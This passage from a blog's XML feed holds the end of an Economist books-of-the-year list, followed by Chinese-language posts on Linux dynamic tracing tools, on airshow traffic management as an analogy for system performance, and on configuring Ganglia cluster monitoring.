painting than a blueprint for modern Europe—and yet it worked well, nonetheless. A masterly retelling, by an Oxford historian. Lenin on the TrainBy Catherine Merridale. Allen Lane; 353 pages; £25. To be published in America by Metropolitan in March 2017How Vladimir Lenin’s railway journey from Switzerland to Russia led to the revolution and changed his country—and the world—for ever. An insightful and sympathetic account, by one of the foremost historians of Russia. East West Street: On the Origins of Genocide and Crimes Against HumanityBy Philippe Sands. Knopf; 448 pages; $32.50 Weidenfeld &amp; Nicolson; £20A distinguished Franco-British advocate traces how a single important word entered the legal canon, while examining the lives of those who brought it into being and the wartime experiences of his own Jewish relatives in Europe. An un-put-downable winner of the Baillie Gifford prize for non-fiction. Economics and businessThe Rise and Fall of American Growth: The US Standard of Living since the Civil WarBy Robert Gordon. Princeton University Press; 762 pages; $39.95 and £29.95Why economic growth soared in America in the early 20th century, and why it won’t be soaring again any time soon, by an outspoken economist who teaches at Northwestern University. Global Inequality: A New Approach for the Age of GlobalisationBy Branko Milanovic. Belknap; 299 pages; $29.95. Harvard University Press; £23.95Surprisingly little is known about what causes inequality. An economist at the Luxembourg Income Study Centre and the City University of New York proposes a bold and interesting new theory. The Great Convergence: Information Technology and the New GlobalizationBy Richard Baldwin. Belknap; 329 pages; $29.95 and £22.95Globalisation has changed fundamentally since the internet revolution in the 1990s. Whereas 20th-century trade involved competition between countries, 21st-century trade is fuzzier, with supply chains crossing borders. An American academic, working in Geneva, argues that, while it might be difficult to help the losers, reversing the trend is even harder. The Man Who Knew: The Life and Times of Alan Greenspan.By Sebastian Mallaby. Penguin Press; 781 pages; $40. Bloomsbury; £25Once a hero, the former chairman of the Federal Reserve is now being called a villain. Sebastian Mallaby, who used to write for The Economist and is married to our editor-in-chief, Zanny Minton Beddoes, examines whether Alan Greenspan was to blame for the financial crisis. Winner of the Financial Times and McKinsey Business Book of the Year award 2016. Alibaba: The House That Jack Ma BuiltBy Duncan Clark. Ecco; 287 pages; $27.99 and £18.99An intriguing insider’s account of how Jack Ma conquered China’s internet, by an early adviser to the company Eccentric Orbits: The Iridium StoryBy John Bloom. Atlantic Monthly Press; 537 pages; $27.50. Grove Press; £16.99The exhaustive (and exhausting) tale of the Iridium communications project and how it was brought back from the dead. Culture, society and travelCleverlands: The Secrets Behind the Success of the World’s Education SuperpowersBy Lucy Crehan. Unbound; 304 pages; £16.99Too much writing about education is polemical and ill-informed. Lucy Crehan’s book is refreshingly fair-minded and makes a case that there is a lot to learn about how other countries learn. Free Speech: Ten Principles for a Connected WorldBy Timothy Garton Ash. Yale University Press; 491 pages; $30. Atlantic; £20How urbanisation and the spread of the internet has increased the possibilities of freedom of expression, but also the consequences that stem from it. A distillation of a lifetime’s research and writing, by the Oxford academic who also created freespeechdebate.com. Another Day in the Death of America: A Chronicle of Ten Short LivesBy Gary Younge. Nation Books; 267 pages; $25.99. Guardian Faber; £16.99The stories of ten young people who were shot and killed on the arbitrarily selected date of Saturday November 23rd 2013. A “long, doleful, piercing cry”, by a journalist on the Guardian, in a country so overwhelmed by gun violence that it has almost given up trying to stop it. The Life Project: The Extraordinary Story of Our Ordinary LivesBy Helen Pearson. Soft Skull; 256 pages; $17.95 Penguin; £9.99How a random, nationwide sample of people linked only by their birth in 1946 has been followed by researchers and data-gatherers, and helped shape public policy across the country. A jewel in the crown of British social science. Meetings with Remarkable ManuscriptsBy Christopher de Hamel. Allen Lane; 632 pages; £30The politics and meaning of medieval manuscripts. A delightful and surprising book, by the man who has examined more manuscripts than anyone before him. Progress: Ten Reasons to Look Forward to the FutureBy Johan Norberg. Oneworld; 246 pages; $24.99 and £16.99A Swedish economic historian studies the many, and often surprising, ways in which human life has improved. The End of Karma: Hope and Fury Among India’s YoungBy Somini Sengupta. Norton; 244 pages; $26.95 and £18.99How India’s youth are trading fatalism and karma for free will and higher expectations, by a former New York Times New Delhi bureau chief who interweaves data, first-hand accounts and archival research to great effect. City of Thorns: Nine Lives in the World’s Largest Refugee CampBy Ben Rawlence. Picador; 384 pages; $26. Portobello; £14.99A chronicle of life in Dadaab refugee camp in northern Kenya, which was supposed to close in November, but hasn’t because its inhabitants have nowhere to go. Beethoven for a Later Age: Living with the String QuartetsBy Edward Dusinberre. University of Chicago Press; 232 pages; $30. Faber &amp; Faber; £18.99The lead violinist of the Takacs Quartet recounts its members’ musical lives, interweaving into the group’s autobiography the story of Beethoven’s 16 string quartets, which are now regarded as the apogee of the chamber-music repertoire. How to Listen to Jazz By Ted Gioia. Basic Books; 272 pages; $24.99 and £16.99Why jazz is unique, and how to distinguish good jazz from bad. No author could have done a better job. FictionThe VegetarianBy Han Kang. Translated by Deborah Smith. Hogarth; 192 pages; $21. Portobello; £8.99This slim novella from South Korea is one of the most erotic literary novels of the season. Winner of the 2016 Man Booker International prize. War and TurpentineBy Stefan Hertmans. Translated by David McKay. Pantheon; 304 pages; $26.95. Harvill Secker; £16.99A lovingly reimagined life of an ordinary man whose life was for ever marked by the first world war. Fine prose from a Flemish-Belgian poet and essayist. The Mandibles: A Family, 2029-2047By Lionel Shriver. Harper; 400 pages; $27.99. Borough Press; £16.99A hilarious, and often brutal, tale of how one family fares when America’s economy collapses. In God they trusted. By the irrepressible author of “We Need to Talk About Kevin”. Swing TimeBy Zadie Smith. Penguin Press; 453 pages; $27. Hamish Hamilton; £18.99A powerful story of lives marred by secrets, unfulfilled potential and the unjustness of the world. This may well be Zadie Smith’s finest novel. Science and technologyI Contain Multitudes: The Microbes Within Us and a Grander View of LifeBy Ed Yong. Ecco; 368 pages; $27.99. Bodley Head; £20A science writer and blogger turns an enthusiastic naturalist’s eye on the bacteria, viruses and other minuscule organisms that cohabit the bodies of humans and other animals. Get to know some little-known villains—and many heroes. The Gene: An Intimate HistoryBy Siddhartha Mukherjee. Scribner; 592 pages; $32. Bodley Head; £25The world is wholly unprepared for the birth of the first human with a genome that has been permanently modified in a lab. By a Pulitzer-winning writer and physician. Patient HM: A Story of Memory, Madness, and Family SecretsBy Luke Dittrich. Random House; 440 pages; $28. Chatto &amp; Windus; £18.99Patient HM became famous in the history of science when a surgeon treated his epilepsy by removing the medial temporal lobes in his brain, causing him to lose most of his memory. A remarkable examination of how neuroscience works, by the surgeon’s grandson. Cure: A Journey into the Science of Mind over BodyBy Jo Marchant. Crown; 320 pages; $26. Canongate; £16.99A thought-provoking exploration of how the mind affects the body and can be harnessed to help treat physical illness, by an award-winning science journalist. The Glass Universe: How the Ladies of the Harvard Observatory Took the Measure of the StarsBy Dava Sobel. Viking; 336 pages; $30. To be published in Britain by Fourth Estate in January 2017The hidden history of the remarkable women whose contribution to astronomy changed our understanding of the stars and man’s place in the universe, by the prize-winning author of “Longitude” and “Galileo’s Daughter”. Our policy is to identify the reviewer of any book by or about someone closely connected with The Economist. Sebastian Mallaby is married to Zanny Minton Beddoes, our editor-in-chief. The review of his book in these pages (“Man in the Dock”, Oct 1st) was written by Martin Wolf, chief economics commentator of the Financial Times. It was edited for length only.]]></content>
      <tags>
        <tag>Economist</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[动态追踪技术专题]]></title>
    <url>%2F2016%2F11%2F26%2FDTrace%2F</url>
    <content type="text"><![CDATA[摘要 动态追踪技术：DTrace for Linux Linux 追踪器选型 应用软件运行速度提升的关键在于有一个好的性能分析器(profiler)帮助指导程序开发。《黑客与画家》（Hackers &amp; Painters） 动态追踪技术通过前面几篇文章的介绍，我们已经可以通过一系列命令，从不同维度获得操作系统当前的性能运行情况。另外，借助类似 Ganglia 这样的开源产品，持续不断地实施性能数据采集和存储，我们基于时间序列的历史性能图形，就可以大致判读出计算集群的资源消耗情况和变化趋势。但是，仅仅这些还是不够的，在很多情况下，我们希望能够知道：“慢，是为什么慢；快，又是为什么快”。如果要回答这个问题，就必须引入另外一件神兵利器：动态追踪技术（Dynamic Tracing）。 鉴于这套兵器过于复杂（牛逼），属于专家级技能， advanced performance analysis and troubleshooting tool。据称掌握该技能需要耗费大约100小时以上，所以如果不是对于系统性能问题有极致追求，以及变态般地技术狂热，建议绕过本文。为了便于展开，今天先起个头，重点梳理下动态追踪技术的发展简史和目前的生态环境。更加具体详细的内容，会在后续的文章中陆续发表。 严格来说，DTrace这个词本身，已经并不是狭义上基于 Solaris 的那套工具了，而是代表的是后现代操作系统的一整套工具家族和方法论。 History 当时 Solaris 操作系统的几个工程师花了几天几夜去排查一个看似非常诡异的线上问题。开始他们以为是很高级的问题，就特别卖力，结果折腾了几天，最后发现其实是一个非常愚蠢的、某个不起眼的地方的配置问题。自从那件事情之后，这些工程师就痛定思痛，创造了 DTrace 这样一个非常高级的调试工具，来帮助他们在未来的工作当中避免把过多精力花费在愚蠢问题上面。毕竟大部分所谓的“诡异问题”其实都是低级问题，属于那种“调不出来很郁闷，调出来了更郁闷”的类型。—《漫谈动态追踪技术》 通观DTrace的演变过程，几乎相当于一部现代操作系统系统的发展史，细查起来，极其复杂。但是有两个人非常值得关注，一个是国际级的布道师，一个是国内的代表人物，初学者完全可以通过阅读他们的文章、代码，甚至微博／Twitter动态，了解动态追踪技术的实际应用情况。 Brendan Gregg前SUN性能工程师，最早的DTrace用户，出版了包括《性能之巅》在内的一大批书籍，囊括了性能问题领域的技术、工具、方法论等方方面面。他是动态追踪技术当之无愧的首席布道师，维护的个人博客发布了大量的原创内容，并且持续保持着相当的活跃度。可以作为第一手的学习资料。 Twitter：个人网站： 章亦春网名 agentzh。开源项目OpenResty创始人，编写了很多 Nginx 的第三方模块， Perl 开源模块，以及最近一些年写的很多 Lua 方面的库。他发表过的《漫谈动态追踪技术》，是目前唯一由Brendan认证的中文资料，入门首选。另外，他本人也在目前的工作、开源项目运营中大量使用动态追踪技术。微博： Linux 追踪器选型动态追踪技术最复杂的地方在于追踪器种类繁多，让人一时无从下手。根据前人的一些经验总结，建议按照以下路径进行选择： 普通模式适用于：开发者, 系统管理员, DevOps, SRE CPU分析 perf_events的应用很广泛，配合Brendan Gregg老师研究的火焰图工具，可以分析程序在所有代码基的资源消耗，精确定位到函数级。例如： 进程追踪1234567# ./execsnoopTracing exec()s. Ctrl-C to end. PID PPID ARGS 22898 22004 man ls 22905 22898 preconv -e UTF-8 22908 22898 pager -s 22907 22898 nroff -mandoc -rLL=164n -rLT=164n -Tutf8 HARD模式适用于：性能或内核工程师 Understanding all the Linux tracers to make a rational decision between them a huge undertaking. 0、dtrace 案例：ipfans:使用dtrace跟踪Python应用 1、ftrace内核hacker的最爱。已经包含在内核，能够支持 tracepoints, kprobes, and uprobes,并提供一些能力: 事件追踪, 可选择过滤器和参数; 事件计数和时间采样，内核概览；基于函数的路径追踪。 动态追踪技术（三）：Tracing your kernel Functions! | @RiboseYim 2、perf_eventsLinux用户的主要追踪器之一，它的源代码在内核中，通常在一个 linux-tools-common包。 3、eBPF基于内核的虚拟机 动态追踪技术（四）：基于 Linux bcc/BPF 实现 Go 程序动态追踪 4、 SystemTap最强有力的追踪器。它可以做几乎所有的事情: 分析，打点, kprobes, uprobes (源子 SystemTap), USDT, 内核编程等。 5、LTTng事件收集器, 优于其它追踪器，支持多种事件类型，包括 USDT。The LTTng Documentation v2.9 Sasha Goldshtein:Tracing Runtime Events in .NET Core on Linux 6、ktap一个很有前景的追踪器，基于lua内核虚拟机 7、dtrace4linux个人开发者业余产出 (Paul Fox) ，将 Sun DTrace迁移到 Linux。 8、OL DTraceOracle Linux DTrace，将 DTrace 迁移到Oracle Linux的实现。 9、sysdig一种新型追踪器， 能够基于类似tcpdump的命令操作 syscall events, 再用lua后处理。 10、strace + gdb strace - trace system calls and signals 动态追踪技术（二）：strace+gdb 溯源 Nginx 内存溢出异常 动态追踪技术（四）：基于 Linux bcc/BPF 实现 Go 程序动态追踪 time: Sleep requires ~7 syscalls 火焰图应用案例 阮一峰:如何读懂火焰图？ Thayne McCombs:如何使用火焰图来降低服务器负载 PROFILING GO APPLICATIONS WITH FLAMEGRAPHS| February 28, 2018 A blazing fast flame graph tool for Node and V8. Used to visualize and explore performance profiling results 勘误 No.001 初稿已删除【大家比较熟知的netfilter，就是基于BPF实现的动态编译器】本来是想表达 iptables 对 bpf 的支持。 扩展阅读：动态追踪技术 动态追踪技术(一)：DTrace 导论 动态追踪技术(二)：strace+gdb 溯源 Nginx 内存溢出异常 动态追踪技术(三)：Tracing Your Kernel Function! 动态追踪技术(四)：基于 Linux bcc/BPF 实现 Go 程序动态追踪 动态追踪技术(五)：Welcome DTrace for Linux 扩展阅读：电子书《Linux Perf Master》 https://riboseyim.gitbook.io/perf https://www.gitbook.com/book/riboseyim/linux-perf-master/details 扩展阅读 Linux 性能诊断:负载评估 Linux 性能诊断:快速检查单 操作系统原理 | How Linux Works（一）：How the Linux Kernel Boots 操作系统原理 | How Linux Works（二）：User Space &amp; RAM 操作系统原理 | How Linux Works（三）：内存管理 操作系统原理 | How Linux Works（三）：网络管理 参考文献 动态追踪技术漫谈 | 章亦春 动态追踪技术（中） - Dtrace、SystemTap、火焰图 | 原创 2016-05-06 章亦春 MacTalk 动态追踪技术-应用性能瓶颈排障利器之火焰图 | 2016-12-01 郑晓川 江凌生 TIGCHAT 运维利器：万能的 strace | 2016-05-24 王子勇 高效运维 (推荐)Linux tracing systems &amp; how they fit together | Julia Evans Give me 15 minutes and I’ll change your view of Linux tracing | Brendan Gregg’s Blog Where has my disk space gone? Flame graphs for file systems | Brendan Gregg’s Blog Container Performance Analysis at DockerCon 2017 | Brendan Gregg’s Blog (推荐) Julia Evans: Linux tracing systems &amp; how they fit together 使用 dtrace 跟踪 Python 应用 | ipfans’s Blog Probing the JVM with BPF/BCC | Sasha Goldshtein 从eBay购物车丢失看处理网络I/O Go’s march to low-latency GC Tracing Runtime Events in .NET Core on Linux | March 30, 2017]]></content>
      <tags>
        <tag>DevOps</tag>
        <tag>Linux</tag>
        <tag>DTrace</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[性能优化思路：从珠海航展交通管控实践谈起]]></title>
    <url>%2F2016%2F11%2F20%2FNetwork-Traffic%2F</url>
    <content type="text"><![CDATA[摘要从2008年算起，笔者已经参加了5届珠海航展。在过去的航展中，群众“吐槽”最多的就是航展期间的交通，笔者亲身经历过的几次，无论是公交还是私家车方式，都体会到了“机场航展、路上车展”的拥堵悲壮感。2016年珠海航展的交通状况却出奇的好，这引起了我的研究兴趣——按照Google SRE的理念，我们应该思考，自己的实践经验是否可以在其它行业复制，不同领域的成功实践是否能为我所借鉴学习。那么这次成功交通流量管控实践，是否可以为解决信息系统性能问题、架构设计优化提供借鉴思路呢？谨以此文，聊作记录。 问题描述展馆位于珠海市三灶机场。机场本身是在一个南面临海的半岛，展会期间的主要流量方向来自市区、珠三角城市群、外地经广深中转人群。主要的人、车流量会从北、东、西三个方面汇入，穿越市区，经过跨海大桥以及机场高速，进入珠海西部区域。如图所示： 这是一个典型的流量突发峰值场景：1、东部区域为主要流量入口，西部区域交通路网稀疏，对接容量不足；沿途多山靠海，地形地貌蜿蜒复杂，任意一点出现延时，会很快扩散，回旋空间小；2、航展两年举办一次，每次一周。特别为此硬性扩容，经济性太差；3、整个业务链条存在明显的薄弱环节：珠海大桥（珠海大道主干道单向4车道，辅道单向3车道，7条车道的车流集中汇集在珠海大桥上桥处，而珠海大桥单向只有3车道）； 治理目标：1、保障展会沿途交通线路通畅：即最大限度提升现有基础设施的通行效率，同时管控流量波动，防止超过预期的突发峰值；2、提供弹性扩容能力，预留一定冗余容量，突发事件预案；3、不能明显影响现有生产业务（城市功能仍需正常运转）。 解决方案一、总量预算a) 公众日每天进场人数不超8万人b)取消现场售票，提高展区周边通行效率，也防止无序流量；c) 取消三日通票，按日售票，通过票务系统引导，分摊每日流量负荷。 最难的恐怕是测算。根据官方通报，主要由道路交通、餐饮等现场承载力测算，应该会参考往年的历史数据，旅行社市场调研情况，甚至可能是官网访问点击数据等。当然实际过程应该比较复杂，暂时没有一手信息，暂且掠过。 另外，技术上测算完了之后，也需要有人敢于为决策拍板。毕竟测算失误，是需要承担责任风险的，压力环境下如何决策是很值得研究的。总之，技术决策过程，都需要有一个人能下最后决心的。 二、流量路径规划第一，优先保障航展核心区交通顺畅；第二，设置外围停车场，实行小客车“P+R”停车换乘第三，安排大运量公共交通接驳，减少核心展区交通压力；第四，设置航展专用车道，保障公交、旅游包车等优先通行；第五，最薄弱环节珠海大道启用同向红绿灯，增设导流实线。 往届现场车辆大排长龙的景像今年没有出现，一路畅通。从技术上分析，上述方案能够取得明显效果，主要思路是一致的，即采用“负载均衡+缓存”机制，适当降低某些业务的优先级和时延，提升通行效率，保证整体可用性。具体表现为： 1、负载均衡针对全线关键薄弱环节的瓶颈，将分流管制区放在珠海大桥之前，将大客车和自驾车流量分离，实际上起到了负载均衡的作用。负载均衡算法增加了大客车的优先权重，虽然会增加自驾车20分钟左右的绕行时间，但是保证了系统整体可用。比起大车小车挤成罐头的惨烈场景，这点损耗非常划算。 另外，在珠海大道开启二级负载均衡。主要措施：启用同向红绿灯，红绿灯口被重新划分为6个车道，每个车道会对应一个信号灯组，增设导流实线。限制加塞变道、不同方向车流抢道的现象发生。 2、缓存机制 一级缓存：自驾车换乘区。将小型自驾车引导进入附近的换乘停车场，而不是直接驶入核心区，中间调用大客车接驳。减少核心区的空间压力，也能聚拢零散客流。 二级缓存：核心区停车场。根据当时现场情况观察，展区周边的停车位经过统一规划，几乎没有乱停乱摆的情况发生。所有观展客流下车即进入验票口的蛇形验票队伍，出来即可换乘接驳大巴，团进团出，不会存在以往核心区滞留人群混乱的局面。 3、实时监控能力升级 例如 无人机：：使用无人机监控道路、停车场地等，提供更灵活的巡逻方式，扩大巡逻覆盖面。既缓解警力不足问题，也减少监控死角，对于潜在违规驾驶人也有一定震慑作用，有利于规范道路行车秩序。 高德地图：当地警方与高德地图合作，航展期间将联合运营实现出行道路交通管制信息和场馆周边停车场、换乘点等信息的实时发布，引导观众避开拥堵路段。此外，出租车GPS可视化系统、高配置的警用摩托车等装备也有一定特色。 上述方案能够落实到位，我相信是与大量引用新型技术密不可分的。 2016珠海航展图集2016珠海航展 中国八一飞行表演队 2016珠海航展 俄罗斯勇士&amp;雨燕飞行表演队 2016珠海航展 英国皇家空军红箭飞行表演队 待续拥塞控制：排队理论，控制理论 Bomb250@排队系统拥塞控制的位置 参考文献 张逸：交通堵塞与性能优化 酷壳：缓存更新的套路]]></content>
      <tags>
        <tag>最佳工程实践</tag>
        <tag>DevOps</tag>
        <tag>网络协议</tag>
        <tag>Linux</tag>
        <tag>SRE</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[开源技术架构漫谈:基于 Ganglia 实现集群性能态势感知]]></title>
    <url>%2F2016%2F11%2F04%2FOpenSource-Ganglia%2F</url>
    <content type="text"><![CDATA[摘要本文以开源项目Ganglia为例，介绍多集群环境下，利用监控系统进行故障诊断、性能瓶颈分析的一般方法。 回顾通过前面的发布过的两篇文章，我们已经大致掌握了描述单个服务器的性能情况的方法。可以从load avgerage等总括性的数据着手，获得系统资源利用率（CPU、内存、I/O、网络）和进程运行情况的整体概念。参考CPU使用率和I/O等待时间等具体的数字，从而自顶向下快速排查各进程状态。也可以在60秒内，通过运行以下10个基本命令，判断是否存在异常、评估饱和度，度量请求队列长度等等。 1.基于Linux单机的负载评估 2.Netflix性能分析模型：In 60 Seconds 在真实的工程实践中，并不能总是通过几行简单的命令，直接获得性能问题的答案。一般不会存在一台单独运行的服务器，它们一定属于某个服务集群之中，就算是同一集群的服务器，也可能属于不同建设周期、硬件配置不同、分工角色不同。或者由不同机房、不通集群的服务器共同协作完成任务。 另外，很多性能问题也需要长时间的追踪、对比才能作出判断。正如任何一个高明的医生，都需要尽可能多地了解、记录病人的病史，不掌握这些情况，盲目下药，无异于庸医杀人。诚如医者曰： 1234夫经方之难精，由来尚矣。今病有内同而外异，亦有内异而外，故五脏六腑之盈虚，血脉荣卫之通塞，固非耳目之所察，必先诊候以审之。世有愚者，读方三年，便谓天下无病可治；及治病三年，乃知天下无方可用。 基于 Ganglia 项目我们可以快速搭建一套高性能的监控系统，展开故障诊断分析、资源扩容预算甚至故障预测。 Ganglia框架简析 一般应用中，需要用到两个核心组件： Gmond （Ganglia Monitoring Daemon）Gmond承担双重角色：1、作为Agent，部署在所有需要监控的服务器上。2、作为收发机，接收或转发数据包。 Gmetad (Ganglia Meta Daemon)负责收集所在集群的数据，并持久化到RRD数据库。根据集群的组网情况，可以部署1-N个。 Web frontendGanglia项目提供一个PHP编写的通用型的Web包，主要实现数据可视化，能提供一些简单的数据筛选UI。页面不多，大量使用了模版技术。HTTP Server方面，用Apache和Nginx都可以。 RRDTool (Round Robin Database)Gmetad收集的时间序列数据都通过RRD存储，RRDTool作为绘图引擎使用。 插件生态Ganglia最重要的特性之一就是提供了一个灵活的数据标准和插件API。它使得我们可以根据系统的情况，很容易地在默认的监控指标集之上，引用或定制其他扩展指标。这一特性在大数据领域也获得了认可，Hadoop,Spark等都开放了面向Ganglia的指标集。在Github上也有很多现成的扩展插件。 Ganglia工作模式项目的名称其实已经反映了作者的设计思路。Ganglia（又作：ganglion）,直译为“神经节”、“中枢神经”。在解剖学上是一个生物组织丛集，通常是神经细胞体的集合。在神经学中，神经节主要是由核周体和附随连结的树突组合而成。神经节经常与其他神经节相互连接以形成一个复杂的神经节系统。神经节提供了身体内不同神经体系之间的依靠点和中介连结，例如周围神经系统和中枢神经系统。 Ganglia的作者意图将服务器集群理解为生物神经系统，每台服务器都是独立工作神经节，通过多层次树突结构连接起来，既可以横向联合，也可以从低向高，逐层传递信息。具体例证就是Ganglia的收集数据工作可以工作在单播（unicast)或多播(multicast)模式下，默认为多播模式。 单播：Gmond收集到的监控数据发送到特定的一台或几台机器上，可以跨网段 多播：Gmond收集到的监控数据发送到同一网段内所有的机器上，同时收集同一网段内的所有机器发送过来的监控数据。因为是以广播包的形式发送，因此需要同一网段内。但同一网段内，又可以定义不同的发送通道。 vi /usr/local/ganglia/etc/gmond.conf 默认配置：123456789101112131415161718192021cluster &#123; name = &quot;cluster01&quot;&#125;udp_send_channel &#123; mcast_join = 239.2.11.71 port = 8649 ttl = 1&#125;udp_recv_channel &#123; mcast_join = 239.2.11.71 port = 8649 bind = 239.2.11.71 retry_bind = true&#125;tcp_accept_channel &#123; port = 8649 gzip_output = no&#125; 单播模式Gmetad增加配置：123udp_recv_channel &#123; port = 8666&#125; 单播模式Gmond增加配置：12345udp_send_channel &#123; host = 192.168.0.39 port = 8666 ttl = 1&#125; 默认装载指标集： 123456789101112131415161718192021222324252627282930313233modules &#123; module &#123; name = &quot;core_metrics&quot; &#125; module &#123; name = &quot;cpu_module&quot; path = &quot;modcpu.so&quot; &#125; module &#123; name = &quot;disk_module&quot; path = &quot;moddisk.so&quot; &#125; module &#123; name = &quot;load_module&quot; path = &quot;modload.so&quot; &#125; module &#123; name = &quot;mem_module&quot; path = &quot;modmem.so&quot; &#125; module &#123; name = &quot;net_module&quot; path = &quot;modnet.so&quot; &#125; module &#123; name = &quot;proc_module&quot; path = &quot;modproc.so&quot; &#125; module &#123; name = &quot;sys_module&quot; path = &quot;modsys.so&quot; &#125;&#125; vi /usr/local/ganglia/etc/gmetad.conf 12345678### 配置数据源，可以多个data_source &quot;cluster01&quot; localhost:8649 data_source &quot;cluster02&quot; 192.168.0.39:8666 192.168.0.48:8666gridname &quot;mygrid&quot;### 指定RRD数据路径rrd_rootdir &quot;/home/data/ganglia/rrds&quot; 查看数据流向12345# netstat -an | grep 86 tcp 0 0 0.0.0.0:8649 0.0.0.0:* LISTEN ##tcp_accept_channeludp 0 0 192.168.0.45:52745 239.2.11.71:8649 ESTABLISHED ##组播udp 0 0 239.2.11.71:8649 0.0.0.0:* udp 0 0 0.0.0.0:8666 0.0.0.0:* ##udp_recv_channel Gmetad所在位置，已经可以收到监控数据的服务器列表：12345# telnet localhost 8649 | grep HOST&lt;HOST NAME=&quot;192.168.0.56&quot; IP=&quot;192.168.0.56&quot; TAGS=&quot;&quot; REPORTED=&quot;1478226772&quot; TN=&quot;6&quot; TMAX=&quot;20&quot; DMAX=&quot;86400&quot; LOCATION=&quot;GZ&quot; GMOND_STARTED=&quot;1477817579&quot;&gt;&lt;/HOST&gt;&lt;HOST NAME=&quot;192.168.0.39&quot; IP=&quot;192.168.0.39&quot; TAGS=&quot;&quot; REPORTED=&quot;1478226771&quot; TN=&quot;7&quot; TMAX=&quot;20&quot; DMAX=&quot;86400&quot; LOCATION=&quot;GZ&quot; GMOND_STARTED=&quot;1477473541&quot;&gt;...... Gmond所在位置，收到的监控指标数据明细：1234567891011# telnet localhost 8649 | grep cpu_idletelnet: connect to address ::1: Connection refused&lt;METRIC NAME=&quot;cpu_idle&quot; VAL=&quot;96.7&quot; TYPE=&quot;float&quot; UNITS=&quot;%&quot; TN=&quot;33&quot; TMAX=&quot;90&quot; DMAX=&quot;0&quot; SLOPE=&quot;both&quot;&gt;&lt;METRIC NAME=&quot;cpu_idle&quot; VAL=&quot;100.0&quot; TYPE=&quot;float&quot; UNITS=&quot;%&quot; TN=&quot;20&quot; TMAX=&quot;90&quot; DMAX=&quot;0&quot; SLOPE=&quot;both&quot;&gt;&lt;METRIC NAME=&quot;cpu_idle&quot; VAL=&quot;91.2&quot; TYPE=&quot;float&quot; UNITS=&quot;%&quot; TN=&quot;4&quot; TMAX=&quot;90&quot; DMAX=&quot;0&quot; SLOPE=&quot;both&quot;&gt;&lt;METRIC NAME=&quot;cpu_idle&quot; VAL=&quot;96.3&quot; TYPE=&quot;float&quot; UNITS=&quot;%&quot; TN=&quot;28&quot; TMAX=&quot;90&quot; DMAX=&quot;0&quot; SLOPE=&quot;both&quot;&gt;&lt;METRIC NAME=&quot;cpu_idle&quot; VAL=&quot;99.9&quot; TYPE=&quot;float&quot; UNITS=&quot;%&quot; TN=&quot;5&quot; TMAX=&quot;90&quot; DMAX=&quot;0&quot; SLOPE=&quot;both&quot;&gt;&lt;METRIC NAME=&quot;cpu_idle&quot; VAL=&quot;83.9&quot; TYPE=&quot;float&quot; UNITS=&quot;%&quot; TN=&quot;14&quot; TMAX=&quot;90&quot; DMAX=&quot;0&quot; SLOPE=&quot;both&quot;&gt;&lt;METRIC NAME=&quot;cpu_idle&quot; VAL=&quot;84.2&quot; TYPE=&quot;float&quot; UNITS=&quot;%&quot; TN=&quot;0&quot; TMAX=&quot;90&quot; DMAX=&quot;0&quot; SLOPE=&quot;both&quot;&gt;&lt;METRIC NAME=&quot;cpu_idle&quot; VAL=&quot;44.1&quot; TYPE=&quot;float&quot; UNITS=&quot;%&quot; TN=&quot;9&quot; TMAX=&quot;90&quot; DMAX=&quot;0&quot; SLOPE=&quot;both&quot;&gt;...... 数据可视化 扩展阅读1没有任何一个开源项目是完美的。 1、告警流程框架：Ganglia本身并不具备，可以选用 Nagios 补充。https://www.ibm.com/developerworks/library/l-ganglia-nagios-1/https://www.quora.com/Ganglia-vs-collectd-vs-cacti-advantage-and-disadvantage 2、日志管理框架：Ganglia本身并不具备，可以选用 Splunk 补充。 3、性能开销预算 对于单纯的Gmond节点来说，性能开销很低。主要的瓶颈在中央节点。 各节点的gmond进程向中央节点发送的udp数据带来的网络开销。如果一个节点每秒发10个包，1000个节点将会发出10000个，每个包有200字节，就有2m字节，10000个包的处理所需要的cpu使用也会上升。 Gmetad默认15秒向gmond取一次xml数据,解析xml文件带来的CPU负荷也会随着管理节点数线性增长。 格外需要注意的是RRD的写入瓶颈。实际应用中需要根据资源情况，调整采样频率、权衡指标数量、引入RRDCached等方式优化。 4、网络流向监控：Ganglia原生支持sFlowGitHub:gmond-proxy project。what are some of the benefits of using the proxy? Firstly, the proxy allows metrics to be filtered, reducing the amount of data logged and increasing the scaleability of the Ganglia collector. Secondly, sFlow-RT generates traffic flow metrics, making them available to Ganglia. Finally, Ganglia is typically used in conjunction with additional monitoring tools that can all be driven using the analytics stream generated by sFlow-RT. 5、可视化 数据可视化（六）常见的数据可视化仪表盘(DashBoard) 数据可视化（七）Graphite 体系结构详解 Ganglia Develop Team Matt Massie:UCB Brent Chun:Developer,UCB David E. Culler:Professor 读者讨论区 隔壁_老吴 ：多播如何跨网段？因为单播需要在服务器端添加所有agent IP，上百台不现实 扩展阅读：开源架构技术漫谈 DevOps 漫谈：基于OpenCensus构建分布式跟踪系统 基于Go语言快速构建一个RESTful API服务 基于Kafka构建事件溯源型微服务 远程通信协议：从 CORBA 到 gRPC 应用程序开发中的日志管理(Go语言描述) 数据可视化（七）Graphite 体系结构详解 动态追踪技术(一)：DTrace 导论 动态追踪技术(二)：strace+gdb 溯源 Nginx 内存溢出异常 动态追踪技术(三)：Tracing Your Kernel Function! 动态追踪技术(四)：基于 Linux bcc/BPF 实现 Go 程序动态追踪 动态追踪技术(五)：Welcome DTrace for Linux DevOps 资讯 | LinkedIn 开源 Kafka Monitor 参考文献 统一监控报警平台架构设计思路|Ganglia+Centreon]]></content>
      <tags>
        <tag>OpenSource</tag>
        <tag>DevOps</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[摄影专辑:珠海航空航天展览]]></title>
    <url>%2F2016%2F10%2F15%2FArtistic-Zhuhai-AirShow%2F</url>
